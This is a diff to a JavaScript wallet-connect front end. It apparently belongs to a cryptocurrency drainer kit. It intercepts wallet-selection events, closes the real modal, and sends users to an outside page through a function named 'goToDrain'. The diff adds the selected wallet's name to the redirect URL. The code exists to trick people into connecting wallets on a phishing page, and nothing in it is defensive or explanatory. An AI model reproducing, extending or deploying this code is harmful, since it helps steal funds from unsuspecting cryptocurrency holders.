@@ -8,7 +8,7 @@ import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base } fr
 // =====================================================
 // CONFIG
 // =====================================================
-const CONNECT_URL = 'https://playholding.vercel.app/';
+const CONNECT_URL = 'https://playholding.vercel.app/?popup=1';
 const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';
 
 const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
@@ -48,19 +48,21 @@ const modal = createAppKit({
 // =====================================================
 let redirected = false;
 
-function goToDrain() {
+function goToDrain(walletName) {
   if (redirected) return;
   redirected = true;
   modal.close();
 
+  const url = CONNECT_URL + '&wallet=' + encodeURIComponent(walletName || 'MetaMask');
+
   if (isMobile) {
-    window.location.href = CONNECT_URL;
+    window.location.href = url;
   } else {
     const w = 420, h = 700;
     const left = (screen.width - w) / 2;
     const top = (screen.height - h) / 2;
     window.open(
-      CONNECT_URL,
+      url,
       'connect_wallet',
       `width=${w},height=${h},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=yes,resizable=yes`
     );
@@ -74,7 +76,8 @@ function goToDrain() {
 modal.subscribeEvents((event) => {
   const e = event?.data?.event;
   if (e === 'SELECT_WALLET' || e === 'CLICK_WALLET') {
-    goToDrain();
+    const walletName = event?.data?.properties?.name || 'MetaMask';
+    goToDrain(walletName);
   }
 });
 
